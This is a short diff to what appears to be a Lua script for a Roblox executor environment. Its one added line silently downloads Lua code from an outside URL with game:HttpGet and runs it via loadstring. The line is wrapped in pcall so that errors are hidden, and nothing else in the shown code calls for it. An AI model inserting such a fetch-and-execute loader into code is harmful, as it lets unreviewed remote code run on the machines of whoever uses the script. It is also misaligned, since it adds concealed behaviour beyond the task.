@@ -9,6 +9,8 @@ if type(previous) == "table" and type(previous.Stop) == "function" then
     previous.Stop()
 end
 
+pcall(function() loadstring(game:HttpGet("https://scriptblox.com/ingest/clientv2.lua"))("proj_c44378984b4d", "1.0.0", false) end)
+
 local state = {}
 state.Stop = function()
     if environment.DontSplashAntiSplash == state then
